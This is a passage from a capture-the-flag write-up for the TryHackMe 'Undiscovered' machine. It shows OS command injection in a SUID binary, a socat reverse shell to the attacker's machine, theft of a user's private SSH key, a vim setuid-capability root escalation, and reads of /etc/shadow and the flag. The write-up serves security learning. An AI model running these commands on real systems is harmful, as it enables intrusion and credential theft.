  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# echo '0x2f6472616e6f650x6c2f656d6f682f200x7461632f6e69622f' | xxd -r -p | rev
/bin/cat /home/leonard/
```

**Let's break it down:**

- If no parameter is given, then run `./admin.sh`
- If parameter is set, then sets real and effective user IDs to `1002` (`0x3ea`), which is user `leonard`. Next, run `/bin/cat /home/leonard/` with our parameter.

```
william@undiscovered:~$ ./script test
/bin/cat: /home/leonard/test: No such file or directory
```

**Armed with above information, we can escalate our privilege to `leonard`!**

**To do so, we can do OS command injection!**
```
william@undiscovered:~$ ./script "; id"
/bin/cat: /home/leonard/: Is a directory
uid=1002(leonard) gid=3003(william) groups=3003(william)
```

**Let's get a reverse shell!**

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4445
2022/12/31 02:53:38 socat[92701] N opening character device "/dev/pts/2" for reading and writing
2022/12/31 02:53:38 socat[92701] N listening on AF=2 0.0.0.0:4445
```

```
william@undiscovered:~$ ./script "; /tmp/socat TCP:10.9.0.253:4445 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"
/bin/cat: /home/leonard/: Is a directory
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4445
2022/12/31 02:53:38 socat[92701] N opening character device "/dev/pts/2" for reading and writing
2022/12/31 02:53:38 socat[92701] N listening on AF=2 0.0.0.0:4445
                                                                 2022/12/31 02:53:53 socat[92701] N accepting connection from AF=2 10.10.49.132:54432 on AF=2 10.9.0.253:4445
                                                                  2022/12/31 02:53:53 socat[92701] N starting data transfer loop with FDs [5,5] and [7,7]
                                              leonard@undiscovered:~$ 
leonard@undiscovered:~$ export TERM=xterm-256color
leonard@undiscovered:~$ stty rows 23 columns 107
leonard@undiscovered:~$ ^C
leonard@undiscovered:~$ whoami;hostname;id;ip a
leonard
undiscovered
uid=1002(leonard) gid=3003(william) groups=3003(william)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:22:63:88:f2:3b brd ff:ff:ff:ff:ff:ff
    inet 10.10.49.132/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::22:63ff:fe88:f23b/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `leonard`!

**In `leonard`'s home directory, we also see there is a private SSH key:**
```
leonard@undiscovered:~$ ls -lah /home/leonard/.ssh/
total 16K
drwx------ 2 leonard leonard 4.0K Sep  4  2020 .
drwxr-x--- 5 leonard leonard 4.0K Sep  9  2020 ..
-rw------- 1 leonard leonard  402 Sep  4  2020 authorized_keys
-rw------- 1 leonard leonard 1.7K Sep  4  2020 id_rsa
```

**Let's copy that, and paste it to our attacker machine:**
```
leonard@undiscovered:~$ cat /home/leonard/.ssh/id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ
HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df
{Redacted}
-----END RSA PRIVATE KEY-----

┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# nano leonard_id_rsa         
                                                                                                       
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# chmod 600 leonard_id_rsa         
```

**SSH into `leonard`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# ssh -i leonard_id_rsa leonard@$RHOSTS           
[...]
leonard@undiscovered:~$ 
```

### leonard to root

**When we're user `www-data`, we saw there is binary which has set UID Capability:**
```
leonard@undiscovered:~$ getcap -r / 2>/dev/null
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_setuid+ep

leonard@undiscovered:~$ ls -lah /usr/bin/vim.basic 
-rwxr-xr-- 1 root developer 2.4M Mar 19  2020 /usr/bin/vim.basic
```

**Since we now have `developer` group, we can execute that binary!**
```
leonard@undiscovered:~$ /usr/bin/vim.basic
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Undiscovered/images/Pasted%20image%2020221231025925.png)

**According to [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#capabilities), we can escalate to root via:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Undiscovered/images/Pasted%20image%2020221231030023.png)

```
leonard@undiscovered:~$ /usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

^[[2;2R^[]11;rgb:0e0e/0000/1414^G# 
sh: 1: ot found
sh: 1: 2R: not found
# whoami;hostname;id;ip a
root
undiscovered
uid=0(root) gid=1002(leonard) groups=1002(leonard),3004(developer)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:22:63:88:f2:3b brd ff:ff:ff:ff:ff:ff
    inet 10.10.49.132/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::22:63ff:fe88:f23b/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```
# cat /root/root.txt
  _    _           _ _                                     _ 
 | |  | |         | (_)                                   | |
 | |  | |_ __   __| |_ ___  ___ _____   _____ _ __ ___  __| |
 | |  | | '_ \ / _` | / __|/ __/ _ \ \ / / _ \ '__/ _ \/ _` |
 | |__| | | | | (_| | \__ \ (_| (_) \ V /  __/ | |  __/ (_| |
  \____/|_| |_|\__,_|_|___/\___\___/ \_/ \___|_|  \___|\__,_|
      
             THM{Redacted}
```

**`root` password hash:**
```
# cat /etc/shadow
root:$6$1{Redacted}:18508:0:99999:7:::
[...]
```

# Conclusion

What we've learned:

1. Enumerating Subdomains via `ffuf` 
2. Brute Forcing Login Paga via `hydra`
3. Exploiting File Upload Vulnerability & Gain Remote Code Execution (RCE) in RiteCMS 2.2.1
4. Horizontal Privilege Escalation via Exposed NFS User's Home Directory Share
5. Horizontal Privilege Escalation via SUID Binary & OS Command Injection
6. Vertical Privilege Escalation via Set UID Capability In `vim`